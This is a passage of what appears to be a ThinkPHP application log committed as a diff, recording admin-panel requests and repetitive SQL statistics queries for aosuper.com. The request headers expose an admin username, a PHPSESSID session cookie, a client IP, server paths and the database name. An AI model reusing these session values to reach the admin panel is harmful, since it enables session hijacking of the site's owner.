+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-10' [ RunTime:0.005932s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-11' [ RunTime:0.005812s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-12' [ RunTime:0.005821s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `ucookie` = '1505630090' [ RunTime:0.005657s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `user` [ RunTime:0.001130s ]
+[ sql ] [ SQL ] SELECT * FROM `user` WHERE  `user` = 'admin' [ RunTime:0.000541s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `seo` [ RunTime:0.001252s ]
+[ sql ] [ SQL ] SELECT * FROM `seo` WHERE  `Id` = 1 LIMIT 1 [ RunTime:0.000473s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `webplug` [ RunTime:0.000939s ]
+[ sql ] [ SQL ] SELECT * FROM `webplug` WHERE  `Id` = 1 LIMIT 1 [ RunTime:0.000292s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `danyecon` [ RunTime:0.001014s ]
+[ sql ] [ SQL ] SELECT * FROM `danyecon` [ RunTime:0.000386s ]
+[ sql ] [ SQL ] SELECT * FROM `danyecon` WHERE  `class` = '备忘录' [ RunTime:0.000302s ]
+---------------------------------------------------------------
+[ 2024-06-13T00:16:05+08:00 ] 179.134.4.167 POST aosuper.com/login.php/newsad/newsTree
+[运行时间：0.111701s] [吞吐率：8.95req/s] [内存消耗：3,812.80kb] [文件加载：48]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BIND ] 'admin'
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'newsad',
+    2 => 'newsTree',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'think_usercookie=1505630090; think_username=admin; language=pt; PHPSESSID=932nevgbah75qp9gsejg6tmp73',
+  'priority' => 'u=1, i',
+  'accept-language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate, br, zstd',
+  'referer' => 'https://aosuper.com/login.php/admin/loadright?page=newsclass&formname=productc',
+  'sec-fetch-dest' => 'empty',
+  'sec-fetch-mode' => 'cors',
+  'sec-fetch-site' => 'same-origin',
+  'origin' => 'https://aosuper.com',
+  'sec-ch-ua-platform' => '"Windows"',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+  'sec-ch-ua-mobile' => '?0',
+  'x-requested-with' => 'XMLHttpRequest',
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'sec-ch-ua' => '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+  'content-length' => '34',
+  'host' => 'aosuper.com',
+)
+[ info ] [ PARAM ] array (
+  'page' => '1',
+  'limit' => '500',
+  'formname' => 'productc',
+)
+[ info ] [ RUN ] app\admin\controller\Newsad->newsTree[ /www/wwwroot/tb.youanfutang.cn/application/admin/controller/Newsad.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000665s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `productc` [ RunTime:0.001162s ]
+[ sql ] [ SQL ] SELECT * FROM `productc` [ RunTime:0.001560s ]
+---------------------------------------------------------------
+[ 2024-06-13T00:17:12+08:00 ] 179.134.4.167 POST aosuper.com/login.php/newsad/addclass
+[运行时间：0.030447s] [吞吐率：32.84req/s] [内存消耗：2,683.05kb] [文件加载：48]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BIND ] 'admin'
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'newsad',
+    2 => 'addclass',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'think_usercookie=1505630090; think_username=admin; language=pt; PHPSESSID=932nevgbah75qp9gsejg6tmp73',
+  'priority' => 'u=1, i',
+  'accept-language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate, br, zstd',
+  'referer' => 'https://aosuper.com/login.php/admin/loadright?page=newsclass&formname=productc',
+  'sec-fetch-dest' => 'empty',
+  'sec-fetch-mode' => 'cors',
+  'sec-fetch-site' => 'same-origin',
+  'origin' => 'https://aosuper.com',
+  'sec-ch-ua-platform' => '"Windows"',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+  'sec-ch-ua-mobile' => '?0',
+  'x-requested-with' => 'XMLHttpRequest',
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'sec-ch-ua' => '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+  'content-length' => '92',
+  'host' => 'aosuper.com',
+)
+[ info ] [ PARAM ] array (
+  'name' => 'UTENSILIOS DE TESTE',
+  'laug' => '简体中文',
+  'topid' => '0',
+  'formname' => 'productc',
+)
+[ info ] [ RUN ] app\admin\controller\Newsad->addclass[ /www/wwwroot/tb.youanfutang.cn/application/admin/controller/Newsad.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000931s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `productc` [ RunTime:0.001287s ]
+[ sql ] [ SQL ] INSERT INTO `productc` (`name` , `laug` , `parent_id` , `create_time` , `sort`) VALUES ('UTENSILIOS DE TESTE' , '简体中文' , '0' , '2024-06-13 00:17:12' , 0) [ RunTime:0.000575s ]
+---------------------------------------------------------------
+[ 2024-06-13T00:17:14+08:00 ] 179.134.4.167 GET aosuper.com/login.php/admin/loadright?page=newsclass&formname=productc
+[运行时间：0.466922s] [吞吐率：2.14req/s] [内存消耗：3,439.66kb] [文件加载：53]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BIND ] 'admin'
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'admin',
+    2 => 'loadright',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'think_usercookie=1505630090; think_username=admin; language=pt; PHPSESSID=932nevgbah75qp9gsejg6tmp73',
+  'priority' => 'u=0, i',
+  'accept-language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate, br, zstd',
+  'referer' => 'https://aosuper.com/login.php/admin/loadright?page=newsclass&formname=productc',
+  'sec-fetch-dest' => 'iframe',
+  'sec-fetch-user' => '?1',
+  'sec-fetch-mode' => 'navigate',
+  'sec-fetch-site' => 'same-origin',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+  'upgrade-insecure-requests' => '1',
+  'sec-ch-ua-platform' => '"Windows"',
+  'sec-ch-ua-mobile' => '?0',
+  'sec-ch-ua' => '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+  'host' => 'aosuper.com',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+  'page' => 'newsclass',
+  'formname' => 'productc',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\admin\controller\Admin->loadright[ /www/wwwroot/tb.youanfutang.cn/application/admin/controller/Admin.php ]
+[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/admin/view/admin/page/newsclass.html [ array (
+  0 => 'languageObj',
+  1 => 'language',
+  2 => 'userid',
+  3 => 'user',
+  4 => 'password',
+  5 => 'ico',
+  6 => 'username',
+  7 => 'companyname',
+  8 => 'webname',
+  9 => 'domain',
+  10 => 'Address',
+  11 => 'person',
+  12 => 'mobile',
+  13 => 'qq',
+  14 => 'Introduction',
+  15 => 'tippw',
+  16 => 'weblogo',
+  17 => 'seowebname',
+  18 => 'seowebdomain',
+  19 => 'seoseotitle',
+  20 => 'seoseokey',
+  21 => 'seoseodsc',
+  22 => 'seoseoheader',
+  23 => 'jstwo',
+  24 => 'jsone',
+  25 => 'url',
+  26 => 'danyecon',
+  27 => 'num',
+  28 => 'webdomain',
+  29 => 'appid',
+  30 => 'miyao',
+  31 => 'fxtit',
+  32 => 'fxms',
+  33 => 'wxtit',
+  34 => 'Hamtime',
+  35 => 'photo',
+  36 => 'wxms',
+  37 => 'photowx',
+  38 => 'viewUV',
+  39 => 'loginnum',
+  40 => 'alluv',
+  41 => 'allmb',
+  42 => 'allorder',
+  43 => 'allkc',
+  44 => 'acviewnum',
+  45 => 'pdviewnum',
+  46 => 'notes',
+  47 => 'formname',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000744s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.001153s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `ucookie` = '1505630090' [ RunTime:0.006177s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `language` [ RunTime:0.001022s ]
+[ sql ] [ SQL ] SELECT * FROM `language` ORDER BY `create_at` DESC [ RunTime:0.001493s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webpv` > 0 ORDER BY `Id` DESC [ RunTime:0.053039s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `member` [ RunTime:0.003613s ]
+[ sql ] [ SQL ] SELECT * FROM `member` ORDER BY `Id` DESC [ RunTime:0.000671s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `order` [ RunTime:0.000984s ]
+[ sql ] [ SQL ] SELECT * FROM `order` ORDER BY `Id` DESC [ RunTime:0.004646s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `news` [ RunTime:0.001232s ]
+[ sql ] [ SQL ] SELECT * FROM `news` ORDER BY `Id` DESC [ RunTime:0.000496s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-01'  AND `webpv` > 0 [ RunTime:0.007301s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-02'  AND `webpv` > 0 [ RunTime:0.006942s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-03'  AND `webpv` > 0 [ RunTime:0.006989s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-04'  AND `webpv` > 0 [ RunTime:0.007118s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-05'  AND `webpv` > 0 [ RunTime:0.007265s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-06'  AND `webpv` > 0 [ RunTime:0.006823s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-07'  AND `webpv` > 0 [ RunTime:0.006998s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-08'  AND `webpv` > 0 [ RunTime:0.006957s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-09'  AND `webpv` > 0 [ RunTime:0.006836s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-10'  AND `webpv` > 0 [ RunTime:0.006557s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-11'  AND `webpv` > 0 [ RunTime:0.006563s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-12'  AND `webpv` > 0 [ RunTime:0.006415s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-01' [ RunTime:0.005891s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-02' [ RunTime:0.007127s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-03' [ RunTime:0.006476s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-04' [ RunTime:0.006481s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-05' [ RunTime:0.006403s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-06' [ RunTime:0.006211s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-07' [ RunTime:0.006069s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-08' [ RunTime:0.006052s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-09' [ RunTime:0.006249s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-10' [ RunTime:0.006118s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-11' [ RunTime:0.006167s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-12' [ RunTime:0.006357s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-01' [ RunTime:0.006532s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-02' [ RunTime:0.006434s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-03' [ RunTime:0.006506s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-04' [ RunTime:0.006461s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-05' [ RunTime:0.006886s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-06' [ RunTime:0.006438s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-07' [ RunTime:0.006445s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-08' [ RunTime:0.006305s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-09' [ RunTime:0.006586s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-10' [ RunTime:0.006439s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-11' [ RunTime:0.006370s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-12' [ RunTime:0.006664s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-01' [ RunTime:0.006146s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-02' [ RunTime:0.006155s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-03' [ RunTime:0.006006s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-04' [ RunTime:0.005947s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-05' [ RunTime:0.005797s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-06' [ RunTime:0.005721s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-07' [ RunTime:0.006131s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-08' [ RunTime:0.006425s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-09' [ RunTime:0.006156s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-10' [ RunTime:0.006322s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-11' [ RunTime:0.005952s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-12' [ RunTime:0.005954s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `ucookie` = '1505630090' [ RunTime:0.005837s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `user` [ RunTime:0.001189s ]
+[ sql ] [ SQL ] SELECT * FROM `user` WHERE  `user` = 'admin' [ RunTime:0.000426s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `seo` [ RunTime:0.000987s ]
+[ sql ] [ SQL ] SELECT * FROM `seo` WHERE  `Id` = 1 LIMIT 1 [ RunTime:0.000349s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `webplug` [ RunTime:0.000766s ]
+[ sql ] [ SQL ] SELECT * FROM `webplug` WHERE  `Id` = 1 LIMIT 1 [ RunTime:0.000256s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `danyecon` [ RunTime:0.000681s ]
+[ sql ] [ SQL ] SELECT * FROM `danyecon` [ RunTime:0.000240s ]
+[ sql ] [ SQL ] SELECT * FROM `danyecon` WHERE  `class` = '备忘录' [ RunTime:0.000242s ]
+---------------------------------------------------------------
+[ 2024-06-13T00:17:14+08:00 ] 179.134.4.167 POST aosuper.com/login.php/newsad/newsTree
+[运行时间：0.109725s] [吞吐率：9.11req/s] [内存消耗：3,813.71kb] [文件加载：48]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BIND ] 'admin'
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'newsad',
+    2 => 'newsTree',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'think_usercookie=1505630090; think_username=admin; language=pt; PHPSESSID=932nevgbah75qp9gsejg6tmp73',
+  'priority' => 'u=1, i',
+  'accept-language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate, br, zstd',
+  'referer' => 'https://aosuper.com/login.php/admin/loadright?page=newsclass&formname=productc',
+  'sec-fetch-dest' => 'empty',
+  'sec-fetch-mode' => 'cors',
+  'sec-fetch-site' => 'same-origin',
+  'origin' => 'https://aosuper.com',
+  'sec-ch-ua-platform' => '"Windows"',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+  'sec-ch-ua-mobile' => '?0',
+  'x-requested-with' => 'XMLHttpRequest',
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'sec-ch-ua' => '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+  'content-length' => '34',
+  'host' => 'aosuper.com',
+)
+[ info ] [ PARAM ] array (
+  'page' => '1',
+  'limit' => '500',
+  'formname' => 'productc',
+)
+[ info ] [ RUN ] app\admin\controller\Newsad->newsTree[ /www/wwwroot/tb.youanfutang.cn/application/admin/controller/Newsad.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000848s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `productc` [ RunTime:0.001684s ]
+[ sql ] [ SQL ] SELECT * FROM `productc` [ RunTime:0.001567s ]
+---------------------------------------------------------------
+[ 2024-06-13T00:17:30+08:00 ] 179.134.4.167 GET aosuper.com/login.php/admin/loadright?page=upproduct&formname=product
+[运行时间：0.449147s] [吞吐率：2.23req/s] [内存消耗：3,437.84kb] [文件加载：53]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BIND ] 'admin'
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'admin',
+    2 => 'loadright',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'think_usercookie=1505630090; think_username=admin; language=pt; PHPSESSID=932nevgbah75qp9gsejg6tmp73',
+  'priority' => 'u=0, i',
+  'accept-language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate, br, zstd',
+  'referer' => 'https://aosuper.com/login.php/admin/loadright?page=product',
+  'sec-fetch-dest' => 'iframe',
+  'sec-fetch-user' => '?1',
+  'sec-fetch-mode' => 'navigate',
+  'sec-fetch-site' => 'same-origin',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+  'upgrade-insecure-requests' => '1',
+  'sec-ch-ua-platform' => '"Windows"',
+  'sec-ch-ua-mobile' => '?0',
+  'sec-ch-ua' => '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+  'host' => 'aosuper.com',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+  'page' => 'upproduct',
+  'formname' => 'product',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\admin\controller\Admin->loadright[ /www/wwwroot/tb.youanfutang.cn/application/admin/controller/Admin.php ]
+[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/admin/view/admin/table_edi/upproduct.html [ array (
+  0 => 'languageObj',
+  1 => 'language',
+  2 => 'userid',
+  3 => 'user',
+  4 => 'password',
+  5 => 'ico',
+  6 => 'username',
+  7 => 'companyname',
+  8 => 'webname',
+  9 => 'domain',
+  10 => 'Address',
+  11 => 'person',
+  12 => 'mobile',
+  13 => 'qq',
+  14 => 'Introduction',
+  15 => 'tippw',
+  16 => 'weblogo',
+  17 => 'seowebname',
+  18 => 'seowebdomain',
+  19 => 'seoseotitle',
+  20 => 'seoseokey',
+  21 => 'seoseodsc',
+  22 => 'seoseoheader',
+  23 => 'jstwo',
+  24 => 'jsone',
+  25 => 'url',
+  26 => 'danyecon',
+  27 => 'num',
+  28 => 'webdomain',
+  29 => 'appid',
+  30 => 'miyao',
+  31 => 'fxtit',
+  32 => 'fxms',
+  33 => 'wxtit',
+  34 => 'Hamtime',
+  35 => 'photo',
+  36 => 'wxms',
+  37 => 'photowx',
+  38 => 'viewUV',
+  39 => 'loginnum',
+  40 => 'alluv',
+  41 => 'allmb',
+  42 => 'allorder',
+  43 => 'allkc',
+  44 => 'acviewnum',
+  45 => 'pdviewnum',
+  46 => 'notes',
+  47 => 'formname',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000691s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.001073s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `ucookie` = '1505630090' [ RunTime:0.006398s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `language` [ RunTime:0.000951s ]
+[ sql ] [ SQL ] SELECT * FROM `language` ORDER BY `create_at` DESC [ RunTime:0.001411s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webpv` > 0 ORDER BY `Id` DESC [ RunTime:0.049829s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `member` [ RunTime:0.003526s ]
+[ sql ] [ SQL ] SELECT * FROM `member` ORDER BY `Id` DESC [ RunTime:0.000764s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `order` [ RunTime:0.000968s ]
+[ sql ] [ SQL ] SELECT * FROM `order` ORDER BY `Id` DESC [ RunTime:0.004725s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `news` [ RunTime:0.001268s ]
+[ sql ] [ SQL ] SELECT * FROM `news` ORDER BY `Id` DESC [ RunTime:0.000423s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-01'  AND `webpv` > 0 [ RunTime:0.007205s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-02'  AND `webpv` > 0 [ RunTime:0.006936s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-03'  AND `webpv` > 0 [ RunTime:0.006608s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-04'  AND `webpv` > 0 [ RunTime:0.006911s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-05'  AND `webpv` > 0 [ RunTime:0.006752s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-06'  AND `webpv` > 0 [ RunTime:0.006503s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-07'  AND `webpv` > 0 [ RunTime:0.006314s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-08'  AND `webpv` > 0 [ RunTime:0.006412s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-09'  AND `webpv` > 0 [ RunTime:0.006565s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-10'  AND `webpv` > 0 [ RunTime:0.006382s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-11'  AND `webpv` > 0 [ RunTime:0.006622s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-12'  AND `webpv` > 0 [ RunTime:0.006605s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-01' [ RunTime:0.006021s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-02' [ RunTime:0.006013s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-03' [ RunTime:0.006075s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-04' [ RunTime:0.006078s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-05' [ RunTime:0.006169s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-06' [ RunTime:0.005817s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-07' [ RunTime:0.005876s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-08' [ RunTime:0.006058s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-09' [ RunTime:0.005850s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-10' [ RunTime:0.006234s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-11' [ RunTime:0.006057s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-12' [ RunTime:0.006051s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-01' [ RunTime:0.006411s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-02' [ RunTime:0.006219s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-03' [ RunTime:0.005943s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-04' [ RunTime:0.005937s ]
